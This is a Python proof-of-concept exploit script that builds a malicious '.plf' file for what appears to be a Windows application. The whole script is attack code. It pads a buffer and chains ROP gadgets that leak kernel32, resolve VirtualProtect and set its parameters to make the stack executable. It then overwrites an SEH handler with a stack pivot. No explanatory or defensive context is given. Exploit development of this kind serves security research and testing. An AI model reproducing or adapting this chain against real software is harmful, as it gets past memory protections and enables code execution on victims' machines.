#!/usr/bin/env python
# PoC7.py
import struct

junk1 = "A"*304

# Get kernel32 address from the stack
rop = struct.pack('L',0x61618563) # XCHG EAX,EBP # RETN
rop+= struct.pack('L',0x616301d7) # POP ECX # RETN
rop+= struct.pack('L',0xfffff0d0) # Offset
rop+= struct.pack('L',0x6162938a) # SUB EAX,ECX # RETN
rop+= struct.pack('L',0x6163227d) # MOV EAX,DWORD PTR DS:[EAX] # RETN

# Calculate VirtualProtect relative to the leaked kernel32 address
rop+= struct.pack('L',0x61628185) # POP EBP # RETN
rop+= struct.pack('L',0xfffee6fc) # Offset
rop+= struct.pack('L',0x6161a228) # ADD EAX,EBP # RETN

# Setup VirtualProtect

# EDI = ROP NOP (RETN)
rop+= struct.pack('L',0x6403650e) # POP EDI # RETN
rop+= struct.pack('L',0x61646807) # RETN (ROP NOP)

# ESI = VirtualProtect()
rop+= struct.pack('L',0x61642aac) # PUSH EAX # POP ESI # RETN 04

 # EBP = ReturnAddress (ptr to jmp esp)
rop+= struct.pack('L',0x6410ba9b) # POP EBP # RETN
rop+= struct.pack('L',0x41414141) # junk
rop+= struct.pack('L',0x61608b81) # Pointer to PUSH ESP # RETN 04

# ESP = lpAddress (automatic)
# Autofilled

# EBX = dwSize
rop+= struct.pack('L',0x6403bed6) # POP EAX # RETN
rop+= struct.pack('L',0xfffffdff) # 512 Bytes
rop+= struct.pack('L',0x640377e0) # NEG EAX # RETN
rop+= struct.pack('L',0x6163dd7f) # PUSH EAX # ADD AL,5E # POP EBX # RETN

# EDX = flNewProtect (0x40)
rop+= struct.pack('L',0x64114086) # POP EAX # RETN *
rop+= struct.pack('L',0xffffffc0) # 0x40 PAGE_EXECUTE_READWRITE *
rop+= struct.pack('L',0x6002d513) # NEG EAX # RETN *
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02 *

# ECX = lpflOldProtect (ptr to W address)
rop+= struct.pack('L',0x6002e5c3) # POP ECX # RETN [Configuration.dll] *
rop+= struct.pack('H',0x4141)     # junk *
rop+= struct.pack('L',0x6404f7eb) # Pointer to writable location *

# EAX = NOP (0x90909090)
rop+= struct.pack('L',0x6162f773) # POP EAX # RETN *
rop+= struct.pack('L',0x90909090) # Nop padding

# PUSH parameters from registers on the stack
rop+= struct.pack('L',0x60010324) # PUSHAD # RETN

junk2 = "C"*(612 - len(rop) - len(junk1))

seh = struct.pack('L',0x600148df) # ADD ESP,400 # RETN

payload = junk1 + rop  + junk2 + seh

f = open('exploit.plf','w')
f.write(payload)
f.close()
